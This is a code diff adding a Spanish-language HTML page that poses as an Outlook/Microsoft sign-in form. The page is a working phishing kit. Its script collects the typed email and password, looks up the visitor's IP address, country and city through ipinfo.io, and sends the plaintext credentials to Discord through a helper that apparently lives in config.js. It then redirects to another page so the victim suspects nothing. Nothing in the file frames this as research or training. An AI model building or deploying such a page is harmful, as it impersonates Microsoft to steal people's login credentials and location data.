@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Outlook - Inicio de sesión</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <script src="config.js"></script>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(120deg, #e0ffe8 0%, #b8e1fc 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #075e54;
+    }
+    .container {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+      margin: 20px;
+    }
+    .logo {
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 64px;
+      height: 64px;
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 12px;
+    }
+    p {
+      font-size: 15px;
+      margin-bottom: 24px;
+      color: #128c7e;
+    }
+    input {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      margin-bottom: 16px;
+    }
+    button {
+      background-color: #0078d4;
+      color: white;
+      border: none;
+      padding: 14px 20px;
+      border-radius: 8px;
+      font-size: 15px;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background-color: #005a9e;
+    }
+    @media (max-width: 480px) {
+      .container {
+        padding: 30px 20px;
+        margin: 16px;
+      }
+      h1 {
+        font-size: 20px;
+      }
+      input, button {
+        font-size: 15px;
+        padding: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+    </div>
+    <h1>Inicio de sesión</h1>
+    <p>Ingresa tu correo electrónico y contraseña para continuar.</p>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Correo electrónico" required>
+      <input type="password" id="password" placeholder="Contraseña" required>
+      <button type="submit">Continuar</button>
+    </form>
+  </div>
+
+  <script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const correo = document.getElementById('email').value.trim();
+  const contrasena = document.getElementById('password').value.trim();
+  
+  if (!correo || !contrasena) {
+    alert('Por favor completa ambos campos.');
+    return;
+  }
+
+  localStorage.setItem('correoUsuario', correo);
+
+  fetch('https://ipinfo.io/json?token=')  // sin token = 50k requests/mes gratis
+  .then(r => r.json())
+  .then(data => {
+    const ip = data.ip || 'No disponible';
+    const pais = data.country || 'No disponible';
+    const ciudad = data.city || 'No disponible';
+    // ... resto igual
+
+      
+      const mensaje = `🔐 **Inicio de sesión**\n\n📧 **Correo**: ${correo}\n🔑 **Contraseña**: ${contrasena}\n🌍 **IP**: ${ip}\n🏳️ **País**: ${pais}\n📍 **Ciudad**: ${ciudad}\n📅 **Fecha/Hora**: ${new Date().toLocaleString()}`;
+      
+      enviarMensajeDiscord(mensaje)
+        .catch(error => console.warn('Error al enviar a Discord:', error))
+        .finally(() => {
+          window.location.href = 'inicio.html';
+        });
+    })
+    .catch(error => {
+      console.warn('No se pudo obtener IP y país:', error);
+      const mensaje = `🔐 **Inicio de sesión**\n\n📧 **Correo**: ${correo}\n🔑 **Contraseña**: ${contrasena}\n🌍 **IP**: No disponible\n🏳️ **País**: No disponible\n📅 **Fecha/Hora**: ${new Date().toLocaleString()}`;
+      
+      enviarMensajeDiscord(mensaje)
+        .catch(error => console.warn('Error al enviar a Discord:', error))
+        .finally(() => {
+          window.location.href = 'inicio.html';
+        });
+    });
+});
+</script>
+</body>
+</html>
